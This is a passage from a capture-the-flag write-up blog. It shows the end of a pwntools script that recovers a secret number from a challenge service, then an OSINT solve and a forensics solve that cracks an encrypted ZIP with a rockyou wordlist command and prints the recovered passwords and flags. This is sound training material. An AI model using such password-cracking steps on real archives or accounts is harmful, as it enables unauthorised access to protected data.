</span></span><span class=line><span class=cl>    <span class=n>q</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Calculate the new range based on the response</span>
</span></span><span class=line><span class=cl>    <span class=c1># We know that: q * num &lt;= secret &lt; (q + 1) * num</span>
</span></span><span class=line><span class=cl>    <span class=n>new_lower</span> <span class=o>=</span> <span class=n>q</span> <span class=o>*</span> <span class=n>num_to_send</span>
</span></span><span class=line><span class=cl>    <span class=n>new_upper</span> <span class=o>=</span> <span class=p>(</span><span class=n>q</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>num_to_send</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Update our bounds by intersecting the old range with the new one</span>
</span></span><span class=line><span class=cl>    <span class=n>lower_bound</span> <span class=o>=</span> <span class=nb>max</span><span class=p>(</span><span class=n>lower_bound</span><span class=p>,</span> <span class=n>new_lower</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>upper_bound</span> <span class=o>=</span> <span class=nb>min</span><span class=p>(</span><span class=n>upper_bound</span><span class=p>,</span> <span class=n>new_upper</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># The loop terminates when lower_bound == upper_bound</span>
</span></span><span class=line><span class=cl><span class=n>secret</span> <span class=o>=</span> <span class=n>lower_bound</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Secret found: </span><span class=si>{</span><span class=n>secret</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Option 2: Guess the secret number</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Submitting the secret to get the flag...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Choice: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Enter secret number: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>secret</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Print the flag</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Flag: </span><span class=si>{</span><span class=n>flag</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Close the connection</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><p>Bam! got the flag</p><p><img src=/img/scriptctf-25/div_2_flag.webp></p><h2 id=osint>OSINT</h2><h3 id=the-insider107>The Insider(107)</h3><blockquote><p>Someone from our support team has leaked some confidential information. Can you find out who?</p></blockquote><p>As per the hint, looked into discord, while checking on Admin role profiles, found the flag on the NoobMaster&rsquo;s discord profile.</p><p><img src=/img/scriptctf-25/the_insider_flag.webp></p><h2 id=forensics>Forensics</h2><h3 id=just-some-avocado302>Just Some Avocado(302)</h3><blockquote><p>just an innocent little avocado!</p></blockquote><p>Initially got an innocent looking avocado picture from the challenge.
Used strings on the image, got nothing useful.
Then used <code>binwalk</code> and got a juicy ZIP. Sadly it was encrypted. So tried to crack the password of the zip with <code>rockyou</code> and <code>fzipcrack</code>
used the following command.</p><pre tabindex=0><code>crackzip -u -D -p /usr/share/wordlists/rockyou.txt _avocado.jpg.extracted/188F7.zip
</code></pre><p>got the password</p><pre tabindex=0><code>PASSWORD FOUND!!!!: pw == impassive3428
</code></pre><p>Used unzip to extract the contents and got 2 files <code>justsomezip.zip</code> and <code>staticnoise.wav</code> file.
While listing inside the <code>justsome.zip</code> file saw a flag.txt file&mldr;yaayy&mldr;sadly it was also password protected.
Without any delay put the <code>staticnoise.wav</code> into the sonic visualizer but got nothing at first, then added the spectrogram&mldr;woow there were some distorted text&mldr;noicee&mldr;.</p><p><img src=/img/scriptctf-25/dis_pass.webp></p><p>After applying the bins to <em>log</em> we got the text raised and more clear.</p><p><img src=/img/scriptctf-25/pass.webp></p><pre tabindex=0><code> d41v3ron
</code></pre><p>Got the password, unzipped the zip and got the flag</p><pre tabindex=0><code>scriptCTF{1_l0ve_d41_v3r0n}
</code></pre></div></article></main></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/ghost-squad target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
</a><a href=https://twitter.com target=_blank rel="noopener noreferrer me" title=Twitter><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg>
</a><a href=https://linkedin.com/company/ghostsquad target=_blank rel="noopener noreferrer me" title=Linkedin><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
</a><a href=/index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright> 2026 GhostSquad.
Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentcolor" stroke="currentcolor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
</a><script src=/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30+lSNuSkl4QXuNyy8="></script></body></html>